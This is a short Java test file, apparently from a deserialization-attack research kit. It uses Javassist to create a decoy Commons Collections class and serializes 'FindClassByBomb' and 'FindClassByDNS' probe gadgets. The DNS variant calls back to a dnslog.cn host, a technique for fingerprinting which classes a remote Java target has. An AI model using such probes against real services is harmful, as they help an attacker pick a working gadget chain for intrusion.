package probeGadget;

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.*;
//https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&mid=2247484178&idx=1&sn=228ccc3d624f2d64a6c1d51555c42eea&chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8&mpshare=1&scene=23&srcid=1231zSEsxQMxcrllvqoBgmcY&sharer_sharetime=1640932147710&sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd
public class test implements Serializable {
    public static void main(String[] args) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("org.apache.commons.collections.map.LazyMap2");
        Class clazz = ctClass.toClass();
        Class a=Class.forName("org.apache.commons.collections.map.LazyMap2");
       ObjectOutputStream out=new ObjectOutputStream((new FileOutputStream("suid.ser")));
      //  out.writeObject(new FindClassByDNS().getObject("http://k4rpnf.dnslog.cn|org.apache.commons.collections.map.LazyMap2"));
        out.writeObject(new FindClassByBomb().getObject("http://k4rpnf.dnslog.cn|org.apache.commons.collections.map.LazyMap2"));
        ObjectInputStream in=new ObjectInputStream(new FileInputStream("suid.ser"));
        Object object=in.readObject();
        System.out.println(object.getClass());
        Class b=Class.forName("org.apache.commons.collections.map.LazyMap2");

    }
    public static Class makeClass(String Classname) throws CannotCompileException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(Classname);
        Class clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    }
    public static Class makeClass2(String Classname) throws  Exception{
        Class clazz=Class.forName(Classname);
        return clazz;
    }
    public static Class[] makeClass3(String Classname) throws  Exception{
        Class clazz=Class.forName(Classname);
        Class[] b=new Class[3];
        b[0]=b[1]=b[2]=clazz;
        return b;
    }

}



